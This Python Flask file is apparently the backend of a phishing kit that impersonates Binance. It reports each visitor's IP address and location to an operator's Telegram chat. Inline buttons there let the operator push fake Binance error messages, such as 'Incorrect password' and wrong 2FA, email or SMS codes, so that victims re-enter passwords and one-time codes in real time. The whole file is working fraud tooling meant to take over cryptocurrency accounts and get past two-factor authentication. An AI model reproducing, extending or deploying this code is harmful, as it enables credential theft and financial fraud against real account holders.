from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
from dotenv import load_dotenv
import os
from telegram import Update, Bot
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, Dispatcher
import threading

load_dotenv()

app = Flask(__name__)
CORS(app, origins=["http://18.144.169.247:3000"])

TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
COMMANDS = {
    "REQUEST_EMAIL_AGAIN": "Binance account not found",
    "REQUEST_PASSWORD_AGAIN": "Incorrect password. Please retry again. You have 3 more chances left.(200001004-a2437132)",
    "REQUEST_MOBILE_APP_VERIFICATION": "Mobile app verification page is not available yet",
    "REQUEST_AUTHENTICATION_EMAIL": "Auth and email page loaded",
    "REQUEST_AUTHENTICATION_PHONE": "Auth and phone page loaded",
    "REQUEST_AUTH_OTP_AGAIN": "You have entered an incorrect 2FA verification code.(200001013-210a9570)",
    "REQUEST_EMAIL_OTP_AGAIN": "Incorrect verification code. Please check your emails or resend the code and try again.(001412-c91b96d1)",
    "REQUEST_PHONE_OTP_AGAIN": "Incorrect verification code. Please check your SMS or resend the code and try again.(001412-c91b96d1)",
    "FINISH": "Redirecting user to the specified URL",
}

# Initialize Telegram bot
bot = Bot(token=TELEGRAM_BOT_TOKEN)
dispatcher = Dispatcher(bot, None, workers=0)

# Handle button clicks
def handle_button_click(update: Update, context):
    query = update.callback_query
    command = query.data
    if command in COMMANDS:
        print(f"COMMAND RECEIVED: {command} - {COMMANDS[command]}")
        query.answer(f"Command received: {command}")
    else:
        query.answer("Invalid command")

# Add button click handler
dispatcher.add_handler(CallbackQueryHandler(handle_button_click))

# Start polling in a separate thread
def start_polling():
    updater = Updater(TELEGRAM_BOT_TOKEN, use_context=True)
    updater.dispatcher.add_handler(CallbackQueryHandler(handle_button_click))
    updater.start_polling()
    updater.idle()

# Start polling when the Flask app starts
threading.Thread(target=start_polling).start()

# Existing routes
@app.route('/notify', methods=['POST', 'OPTIONS'])
def notify():
    if request.method == 'OPTIONS':
        return jsonify({"status": "success"}), 200

    data = request.json
    ip = request.remote_addr

    message = f"New User Visited!\nIP: {ip}\nLocation: {get_location(ip)}"
    payload = {
        "chat_id": os.getenv('TELEGRAM_CHAT_ID'),
        "text": message,
        "reply_markup": {
            "inline_keyboard": [
                [{"text": "REQUEST EMAIL AGAIN", "callback_data": "REQUEST_EMAIL_AGAIN"}],
                [{"text": "REQUEST PASSWORD AGAIN", "callback_data": "REQUEST_PASSWORD_AGAIN"}],
                [{"text": "REQUEST MOBILE APP VERIFICATION", "callback_data": "REQUEST_MOBILE_APP_VERIFICATION"}],
                [{"text": "REQUEST AUTHENTICATION/EMAIL", "callback_data": "REQUEST_AUTHENTICATION_EMAIL"}],
                [{"text": "REQUEST AUTHENTICATION/PHONE", "callback_data": "REQUEST_AUTHENTICATION_PHONE"}],
                [{"text": "REQUEST AUTH OTP AGAIN", "callback_data": "REQUEST_AUTH_OTP_AGAIN"}],
                [{"text": "REQUEST EMAIL OTP AGAIN", "callback_data": "REQUEST_EMAIL_OTP_AGAIN"}],
                [{"text": "REQUEST PHONE OTP AGAIN", "callback_data": "REQUEST_PHONE_OTP_AGAIN"}],
                [{"text": "FINISH", "callback_data": "FINISH"}],
            ]
        }
    }
    bot.send_message(chat_id=os.getenv('TELEGRAM_CHAT_ID'), text=message, reply_markup=payload['reply_markup'])

    return jsonify({"status": "success"})

def get_location(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=country,city")
        location = response.json()
        return f"{location.get('city', 'Unknown')}, {location.get('country', 'Unknown')}"
    except:
        return "Location unavailable"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
